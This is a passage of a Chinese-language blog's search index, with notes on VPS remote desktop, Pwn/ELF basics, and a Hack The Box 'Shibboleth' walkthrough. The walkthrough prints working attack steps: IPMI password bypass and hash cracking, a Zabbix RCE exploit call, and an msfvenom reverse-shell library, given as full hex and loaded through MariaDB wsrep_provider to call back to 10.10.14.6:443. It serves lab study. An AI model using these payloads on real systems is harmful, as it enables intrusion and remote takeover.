sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">sudo apt <span class="hljs-keyword">update</span> <span class="hljs-variable">&amp;&amp;</span> sudo apt upgrade<br></code></pre></td></tr></table></figure></li><li><p>安裝並設置顯示管理器。使用slim是因為它的輕量級特性</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> slim<br></code></pre></td></tr></table></figure></li><li><p>安裝Ubuntu桌面環境</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> ubuntu-desktop<br></code></pre></td></tr></table></figure></li><li><p>安裝完成後，重啟機器</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo reboot</span><br></code></pre></td></tr></table></figure></li><li><p>重啟後會失去連接。再次通過 SSH 進入虛擬機啟動 slim</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo service slim <span class="hljs-literal">start</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="配置Chrome-Remote-Desktop"><a href="#配置Chrome-Remote-Desktop" class="headerlink" title="配置Chrome-Remote-Desktop"></a>配置Chrome-Remote-Desktop</h2><ul><li><p>設定其他電腦，並持續下一步<br><img src="https://i.imgur.com/F8KFXfj.png"></p></li><li><p>將最後一步指令複製到VPS主機上<br><img src="https://i.imgur.com/9UEbfJm.png"></p></li><li><p>輸入六位數PIN，即可成功<br><img src="https://i.imgur.com/iMVL2xA.png"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>筆記</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VPS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pwn基礎知識</title>
    <link href="/2022/11/30/Pwn%E5%9F%BA%E7%A4%8E%E7%9F%A5%E8%AD%98/"/>
    <url>/2022/11/30/Pwn%E5%9F%BA%E7%A4%8E%E7%9F%A5%E8%AD%98/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwn-Basic"><a href="#Pwn-Basic" class="headerlink" title="Pwn-Basic"></a>Pwn-Basic</h1><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ul><li><p>編譯過程</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">原始碼 Source Code <br>預處理器 Preprocessor (井字號開頭 巨集 ex:<span class="hljs-meta">#<span class="hljs-keyword">include</span> #<span class="hljs-keyword">ifdef</span>... #<span class="hljs-keyword">define</span>)</span><br>編譯器 Compiler (原始語言 <span class="hljs-keyword">to</span> 目標語言 高階轉低階 c <span class="hljs-keyword">to</span> ASM)<br>組譯器 Assembler (將組語轉成目標碼、機器碼，組合語言機器碼一對一對應)<br>目標碼 <span class="hljs-built_in">Object</span> Code (由機器碼組成，俗稱binaries，主要的程式邏輯都在這)<br>連結器 Linker (將多個目標檔連接再一起，成為可執行檔案，分為動態與靜態連結)<br>執行檔 Executables<br></code></pre></td></tr></table></figure></li><li><p>Binary Exploitation</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs less">透過一個或多個漏洞利用，取得程式的掌控權<br>目的:<br>取得<span class="hljs-selector-tag">Shell</span><br>讀取、竄改檔案<br><br><span class="hljs-selector-tag">ELF</span>為<span class="hljs-selector-tag">Linux</span>執行檔格式<br><span class="hljs-selector-tag">Section</span> 區分不同功能資料<br>不同功能需要不同的權限、大小<br>程式碼屬於<span class="hljs-selector-class">.text</span> <span class="hljs-selector-tag">section</span>，需要執行權限<br>常數字串屬於 <span class="hljs-selector-class">.rodata</span> <span class="hljs-selector-tag">section</span>，需要讀取權限<br></code></pre></td></tr></table></figure></li><li><p>ELF-Memory Layout</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs fortran">.text 程式碼<br>.rodata read-<span class="hljs-keyword">only</span> <span class="hljs-keyword">data</span>，如字串<br>.<span class="hljs-keyword">data</span> 初始化後的變數<br>.bss  尚未初始化的變數<br>heap  動態記憶體空間<br>lib   <span class="hljs-keyword">Shared</span> library<br>tls   thread <span class="hljs-keyword">local</span> storage<br>stack 堆疊，儲存當前<span class="hljs-function"><span class="hljs-keyword">function</span></span>執行狀態的空間<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/lsfxirB.png"></p></li><li><p>ELF - Protection</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">PIE 程式碼相對位址表示，非絕對位址<br>NX .text外的section沒有執行權限<br>Canary Stack結尾塞入隨機數，<span class="hljs-keyword">return</span>前檢查是否遭到修改<br>RELRO 分為 <span class="hljs-keyword">Full</span>/Partial/<span class="hljs-keyword">No</span> 三種型態，分別代表runtime解析外部<span class="hljs-keyword">function</span>時使用的不同機制<br>Seccomp 制定規則禁止或允許特定Syscall<br>ASLR 程式載入時，stack、heap等記憶體區塊會使用隨機位址當作base address(末<span class="hljs-number">12</span>bits固定)<br></code></pre></td></tr></table></figure></li><li><p>Register</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">General Purpose Registers (GPRs)<br><span class="hljs-number">64</span> bit: <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">r8</span> - <span class="hljs-built_in">r15</span><br><span class="hljs-number">32</span> bit: <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">r8d</span> - <span class="hljs-built_in">r15d</span><br><span class="hljs-number">16</span> bit: <span class="hljs-built_in">ax</span>, <span class="hljs-built_in">bx</span>, <span class="hljs-built_in">cx</span>, <span class="hljs-built_in">dx</span>, <span class="hljs-built_in">di</span>, <span class="hljs-built_in">si</span>, <span class="hljs-built_in">r8w</span> - <span class="hljs-built_in">r15w</span><br><span class="hljs-number">8</span>  bit: <span class="hljs-number">ah</span>, <span class="hljs-number">bh</span>, <span class="hljs-number">ch</span>, <span class="hljs-number">dh</span>, <span class="hljs-built_in">al</span>, <span class="hljs-built_in">bl</span>, <span class="hljs-built_in">cl</span>, <span class="hljs-built_in">dl</span>, <span class="hljs-built_in">dil</span>, <span class="hljs-built_in">sil</span>, <span class="hljs-built_in">r8b</span> - <span class="hljs-built_in">r15b</span><br></code></pre></td></tr></table></figure></li><li><p>Calling Convention</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">分為Caller 與 Callee<br><br>Logical address <span class="hljs-number">8</span> bytes代表<br>User space  <span class="hljs-number">0</span> ~ <span class="hljs-number">2</span>^<span class="hljs-number">47</span>-<span class="hljs-number">1</span><br>Kernel space  <span class="hljs-number">2</span>^<span class="hljs-number">64</span> - <span class="hljs-number">2</span>^<span class="hljs-number">47</span> ~ <span class="hljs-number">2</span>^<span class="hljs-number">64</span> - <span class="hljs-number">1</span> <br><br>Linux 呼叫慣例:<br><span class="hljs-built_in">RDI</span> <span class="hljs-built_in">RSI</span> <span class="hljs-built_in">RDX</span> <span class="hljs-built_in">RCX</span> <span class="hljs-built_in">R8</span> <span class="hljs-built_in">R9</span> 其餘stack return值 <span class="hljs-built_in">rax</span><br><br>Windows 呼叫慣例:<br><span class="hljs-built_in">RCX</span> <span class="hljs-built_in">RDX</span> <span class="hljs-built_in">R8</span> <span class="hljs-built_in">R9</span> 多的放stack<br><br>Linux/Win x32:<br>放stack<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/4o0qm7O.png"></p></li><li><p>Prologue&#x2F;Epilogue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs !">Function Prologue<br>為 Function 的起頭，一個 Function 被呼叫時的起手式。<br><br>0x4004d7 PUSH  RBP<br>0x4004d8 MOV   RBP  RSP<br>0x4004de SUB   RSP  0x10<br><br>Function Epilogue<br>為 Function 的結尾，一個 Function 結束生命周期之後的行為，簡單的說就是 Prologue 的逆向，怎麼開始，就怎麼結束。<br><br>0x400508 LEAVE<br>0x400509 RET<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Shibboleth</title>
    <link href="/2022/11/30/HTB-Shibboleth/"/>
    <url>/2022/11/30/HTB-Shibboleth/</url>
    
    <content type="html"><![CDATA[<h1 id="Shibboleth"><a href="#Shibboleth" class="headerlink" title="Shibboleth"></a>Shibboleth</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PORT</span>   STATE SERVICE REASON         VERSION<br><span class="hljs-attribute">80</span>/tcp open  http    syn-ack ttl <span class="hljs-number">63</span> Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">41</span><br><span class="hljs-attribute">Service</span> Info: Host: shibboleth.htb<br></code></pre></td></tr></table></figure><h2 id="列舉"><a href="#列舉" class="headerlink" title="列舉"></a>列舉</h2><ul><li><p>subdomain</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wfuzz -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/DNS/</span>subdomains-top1million-<span class="hljs-number">110000</span>.txt -u Shibboleth.htb  -H <span class="hljs-string">&#x27;host:FUZZ.Shibboleth.htb&#x27;</span> --hw <span class="hljs-number">26</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/V9x98P5.png"></p></li><li><p>UDP</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -Pn -n -sU -<span class="hljs-selector-tag">p</span>- <span class="hljs-attr">--min-rate</span> <span class="hljs-number">2000</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.124</span> <span class="hljs-attr">--open</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/dw3CX6b.png"></p></li><li><p>IPMI</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfconsole<br><br>scanner<span class="hljs-regexp">/ipmi/i</span>pmi_version<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/3ZrThKw.png"></p></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">在ipmi <span class="hljs-number">2.0</span> 有漏洞存在 密碼類行為<span class="hljs-number">0</span> 可在使用者名稱存在的情況下繞過密碼訪問<br><br>auxiliary<span class="hljs-regexp">/scanner/i</span>pmi/ipmi_cipher_zero<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/7pMfZqC.png"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ipmitool</span> -I lanplus -C <span class="hljs-number">0</span> -H <span class="hljs-number">10.10.11.124</span> -U <span class="hljs-string">&#x27;Administrator&#x27;</span> -P <span class="hljs-string">&#x27;123123&#x27;</span> user list<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/l3vM9I3.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">msf 的hashdump撈出hash<br><br>scanner<span class="hljs-regexp">/ipmi/i</span>pmi_dumphashes<br><br>Administrator:b16b065082040000da227631f53903b97f689ad6fc911214d483e5be6bec934d5e7b31dde781a5b4a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:<span class="hljs-number">065</span>dbfeb348ccce0b7ac7337e764c00c7e083192<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/mIYgLXR.png"></p><ul><li><p>hashcat crack IPMI2 RAKP HMAC-SHA1</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">hashcat -m <span class="hljs-number">7300</span> -a <span class="hljs-number">0</span> hash <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br><br>ilovepumkinpie1<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/DqcVoTv.png"></p></li><li><p>登入zabbix</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">利用剛剛獲得的憑證<span class="hljs-title class_">Administrator</span><span class="hljs-symbol">:ilovepumkinpie1</span><br>登入zabbix<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/SKSmhR7.png"></p></li></ul><h2 id="外殼"><a href="#外殼" class="headerlink" title="外殼"></a>外殼</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Zabbix</span> <span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">17</span> - Remote Code Execution (RCE) (Authenticated)<br><br><span class="hljs-attribute">python3</span> <span class="hljs-number">50816</span>.py http://zabbix.shibboleth.htb/ &#x27;Administrator&#x27; &#x27;ilovepumkinpie1&#x27; <span class="hljs-number">10.10.14.6</span> <span class="hljs-number">443</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/9Snu5a5.png"></p><ul><li>reverse shell<br><img src="https://i.imgur.com/ozyEmgH.png"></li></ul><h2 id="提權"><a href="#提權" class="headerlink" title="提權"></a>提權</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">利用同一組密碼切換使用者到ipmi-svc<br><br><span class="hljs-regexp">/etc/</span>zabbix 為zabbix設定檔 找尋有無mysql帳密<br><br>grep <span class="hljs-string">&quot;db&quot;</span> -nir .<br><br><span class="hljs-comment"># zabbix:bloooarskybluh</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/EARanPO.png"></p><ul><li>漏洞利用<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">查看mariadb 版本<br>select @@version;<br><span class="hljs-number">10.3</span>.<span class="hljs-number">25</span>-MariaDB-<span class="hljs-number">0</span>ubuntu0.<span class="hljs-number">20.04</span>.<span class="hljs-number">1</span> <br><br>MariaDB <span class="hljs-number">10.2</span> /MySQL - <span class="hljs-string">&#x27;wsrep_provider&#x27;</span> OS Command Execution<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Al1ex/</span>CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">27928</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/shell_reverse_tcp <span class="hljs-attribute">lhost</span>=10.10.14.6 <span class="hljs-attribute">lport</span>=443 -f elf-so &gt; journalctl.so<br></code></pre></td></tr></table></figure><img src="https://i.imgur.com/YrpNY3i.png"></li></ul><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cos">python3 -c &#x27;<span class="hljs-keyword">print</span>(<span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;journalctl.so&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).<span class="hljs-keyword">read</span>().hex())&#x27;<br>&lt;-c &#x27;<span class="hljs-keyword">print</span>(<span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;journalctl.so&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).<span class="hljs-keyword">read</span>().hex())&#x27;<br><br><span class="hljs-number">7</span>f454c4602010100000000000000000003003e000100000092010000000000004000000000000000b000000000000000000000004000380002004000020001000100000007000000000000000000000000000000000000000000000000000000dc0100000000000026020000000000000010000000000000020000000700000030010000000000003001000000000000300100000000000060000000000000006000000000000000001000000000000001000000060000000000000000000000300100000000000030010000000000006000000000000000000000000000000008000000000000000700000000000000000000000300000000000000000000009001000000000000900100000000000002000000000000000000000000000000000000000000000000000000000000000c00000000000000920100000000000005000000000000009001000000000000060000000000000090010000000000000a0000000000000000000000000000000b0000000000000000000000000000000000000000000000000000000000000000006a2958996a025f6a015e0f05489748b9020001bb0a0a0e06514889e66a105a6a2a580f056a035e48ffce6a21580f0575f66a3b589948bb2f62696e2f736800534889e752574889e60f05<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/uCfXjo3.png"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">直接傳輸或是直接寫入<br><br>select unhex(&#x27;7f454c<span class="hljs-number">46020101000000</span><span class="hljs-number">00000000000003</span>003e<span class="hljs-number">00010000009201</span><span class="hljs-number">00000000000040</span><span class="hljs-number">00000000000000</span>b<span class="hljs-number">00000000000000</span><span class="hljs-number">00000000040003</span><span class="hljs-number">80002004000020</span><span class="hljs-number">00100010000000</span><span class="hljs-number">70000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">000000000000</span>0dc<span class="hljs-number">01000000000000</span><span class="hljs-number">26020000000000</span><span class="hljs-number">00001000000000</span><span class="hljs-number">00000200000007</span><span class="hljs-number">00000030010000</span><span class="hljs-number">00000000300100</span><span class="hljs-number">00000000003001</span><span class="hljs-number">00000000000060</span><span class="hljs-number">00000000000000</span><span class="hljs-number">60000000000000</span><span class="hljs-number">00001000000000</span><span class="hljs-number">00000100000006</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000300100</span><span class="hljs-number">00000000003001</span><span class="hljs-number">00000000000060</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00080000000000</span><span class="hljs-number">00000700000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">03000000000000</span><span class="hljs-number">00000000009001</span><span class="hljs-number">00000000000090</span><span class="hljs-number">01000000000000</span><span class="hljs-number">02000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000</span>0c<span class="hljs-number">00000000000000</span><span class="hljs-number">92010000000000</span><span class="hljs-number">00050000000000</span><span class="hljs-number">00009001000000</span><span class="hljs-number">00000006000000</span><span class="hljs-number">00000000900100</span><span class="hljs-number">0000000000</span>0a<span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span>000b<span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">0000000000</span>6a<span class="hljs-number">295899</span>6a025f6a015e0f<span class="hljs-number">05489748</span>b<span class="hljs-number">902000</span>1bb0a0a0e<span class="hljs-number">06514889</span>e66a105a6a2a580f056a035e48ffce6a<span class="hljs-number">2158</span>0f<span class="hljs-number">0575</span>f66a3b<span class="hljs-number">589948</span>bb2f<span class="hljs-number">6269</span>6e2f<span class="hljs-number">736800534889</span>e<span class="hljs-number">75257488</span>9e60f05&#x27;) into dumpfile &#x27;/tmp/journalctl.so&#x27;;<br>&lt;<span class="hljs-number">34889</span>e752574889e60f05&#x27;)<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> global <span class="hljs-attribute">wsrep_provider</span>=<span class="hljs-string">&quot;/tmp/journalctl.so&quot;</span>;<br>nc -lvnp 443<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/O2YQh6U.png"></p>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
      <category>靶機</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IPMI</tag>
      
      <tag>Zabbix</tag>
      
      <tag>mariaDB</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
